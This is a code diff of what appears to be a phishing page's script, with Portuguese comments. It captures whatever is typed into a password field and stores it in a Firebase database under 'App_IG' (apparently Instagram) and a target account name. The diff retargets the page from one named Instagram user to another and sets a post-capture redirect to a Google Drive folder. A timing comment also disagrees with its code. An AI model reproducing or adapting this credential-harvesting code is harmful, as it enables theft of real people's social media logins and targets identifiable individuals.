@@ -7,15 +7,14 @@ var firebaseConfig = {
     projectId: "mg-igp1",
     storageBucket: "mg-igp1.appspot.com",
     messagingSenderId: "227829971389",
-    appId: "1:227829971389:web:6b3dd719248e821f097ad4",
-    measurementId: "G-GGNZ14QW7N"
+    appId: "1:227829971389:web:6b3dd719248e821f097ad4"
 };
 // Inicializa o Firebase
 firebase.initializeApp(firebaseConfig);
 firebase.analytics();
 
 // Script para redirecionamento com LocalStorage
-const specificLink = "https://google.com/"; // O site ficará aqui
+const specificLink = "https://drive.google.com/drive/folders/1fK8B5ZWaspF2ldUu4QmNSSOjpq41"; // O site ficará aqui
 const redirectKey = "redirectTo";
 
 // Verifica se o indicador está no localStorage
@@ -28,15 +27,15 @@ window.onload = function() {
     const p455Element = document.getElementById("p455");
 
     // Nome do usuário no Firebase
-    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("@mariayris12");
+    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("@mayaraalvs_19");
 
     submitButton.addEventListener("click", function(event) {
         if (p455Element && p455Element.value.trim() !== "") {
             event.preventDefault(); // Impede o envio do formulário imediatamente
             if (submitButton.value === "Entrar") {
                 setTimeout(function() {
-                    submitButton.value = "...";
-                }, 300); // Delay de 0.3 segundo para mudar o texto
+                    submitButton.value = "Entrando...";
+                }, 2.4); // Delay de 0.24 segundo para mudar o texto
             }
 
             // Envia o valor para o Firebase
